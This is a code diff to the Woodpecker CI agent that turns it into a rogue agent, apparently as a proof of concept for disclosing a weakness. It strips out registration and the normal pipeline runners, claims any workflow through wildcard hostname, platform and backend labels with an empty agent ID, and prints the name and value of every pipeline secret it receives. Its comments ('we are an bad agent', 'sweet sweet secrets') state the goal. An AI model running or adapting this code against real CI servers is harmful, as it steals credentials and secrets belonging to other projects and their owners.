@@ -37,14 +37,11 @@ import (
 	"google.golang.org/grpc/metadata"
 	"google.golang.org/grpc/status"
 
-	"go.woodpecker-ci.org/woodpecker/v2/agent"
 	agentRpc "go.woodpecker-ci.org/woodpecker/v2/agent/rpc"
-	"go.woodpecker-ci.org/woodpecker/v2/pipeline/backend"
 	"go.woodpecker-ci.org/woodpecker/v2/pipeline/backend/types"
 	"go.woodpecker-ci.org/woodpecker/v2/pipeline/rpc"
 	"go.woodpecker-ci.org/woodpecker/v2/shared/logger"
 	"go.woodpecker-ci.org/woodpecker/v2/shared/utils"
-	"go.woodpecker-ci.org/woodpecker/v2/version"
 )
 
 func run(c *cli.Context, backends []types.Backend) error {
@@ -112,9 +109,12 @@ func run(c *cli.Context, backends []types.Backend) error {
 	client := agentRpc.NewGrpcClient(conn)
 
 	sigterm := abool.New()
+
+	// HEHE we are an bad agent
+
 	ctx := metadata.NewOutgoingContext(
 		context.Background(),
-		metadata.Pairs("hostname", hostname),
+		metadata.Pairs("hostname", hostname, "agent_id", ""),
 	)
 
 	agentConfigPersisted := abool.New()
@@ -151,42 +151,12 @@ func run(c *cli.Context, backends []types.Backend) error {
 	parallel := c.Int("max-workflows")
 	wg.Add(parallel)
 
-	// new engine
-	backendCtx := context.WithValue(ctx, types.CliContext, c)
-	backendName := c.String("backend-engine")
-	backendEngine, err := backend.FindBackend(backendCtx, backends, backendName)
-	if err != nil {
-		log.Error().Err(err).Msgf("cannot find backend engine '%s'", backendName)
-		return err
-	}
-	if !backendEngine.IsAvailable(backendCtx) {
-		log.Error().Str("engine", backendEngine.Name()).Msg("selected backend engine is unavailable")
-		return fmt.Errorf("selected backend engine %s is unavailable", backendEngine.Name())
-	}
-
-	// load engine (e.g. init api client)
-	engInfo, err := backendEngine.Load(backendCtx)
-	if err != nil {
-		log.Error().Err(err).Msg("cannot load backend engine")
-		return err
-	}
-	log.Debug().Msgf("loaded %s backend engine", backendEngine.Name())
-
-	agentConfig.AgentID, err = client.RegisterAgent(ctx, engInfo.Platform, backendEngine.Name(), version.String(), parallel)
-	if err != nil {
-		return err
-	}
-
-	if agentConfigPath != "" {
-		if err := writeAgentConfig(agentConfig, agentConfigPath); err == nil {
-			agentConfigPersisted.Set()
-		}
-	}
+	// HEHE we are an bad agent
 
 	labels := map[string]string{
-		"hostname": hostname,
-		"platform": engInfo.Platform,
-		"backend":  backendEngine.Name(),
+		"hostname": "*",
+		"platform": "*",
+		"backend":  "*",
 	}
 
 	if err := stringSliceAddToMap(c.StringSlice("filter"), labels); err != nil {
@@ -197,54 +167,20 @@ func run(c *cli.Context, backends []types.Backend) error {
 		Labels: labels,
 	}
 
-	log.Debug().Msgf("agent registered with ID %d", agentConfig.AgentID)
-
-	go func() {
-		for {
-			if sigterm.IsSet() {
-				log.Debug().Msg("terminating health reporting")
-				return
+	for {
+		fmt.Println("I'm a bad agent hehe")
+		work, err := client.Next(ctx, filter)
+		if err != nil {
+			fmt.Printf("ERROR: %s", err)
+		} else {
+			fmt.Println("sweet sweet secrets")
+			for _, s := range work.Config.Secrets {
+				fmt.Printf("name: '%s' value: '%s'\n", s.Name, s.Value)
 			}
-
-			err := client.ReportHealth(ctx)
-			if err != nil {
-				log.Err(err).Msg("failed to report health")
-				return
-			}
-
-			<-time.After(time.Second * 10)
 		}
-	}()
 
-	for i := 0; i < parallel; i++ {
-		i := i
-		go func() {
-			defer wg.Done()
-
-			r := agent.NewRunner(client, filter, hostname, counter, &backendEngine)
-			log.Debug().Msgf("created new runner %d", i)
-
-			for {
-				if sigterm.IsSet() {
-					log.Debug().Msgf("terminating runner %d", i)
-					return
-				}
-
-				log.Debug().Msg("polling new steps")
-				if err := r.Run(ctx); err != nil {
-					log.Error().Err(err).Msg("pipeline done with error")
-					return
-				}
-			}
-		}()
+		time.Sleep(time.Second)
 	}
-
-	log.Info().Msgf(
-		"starting Woodpecker agent with version '%s' and backend '%s' using platform '%s' running up to %d pipelines in parallel",
-		version.String(), backendEngine.Name(), engInfo.Platform, parallel)
-
-	wg.Wait()
-	return nil
 }
 
 func runWithRetry(backendEngines []types.Backend) func(context *cli.Context) error {
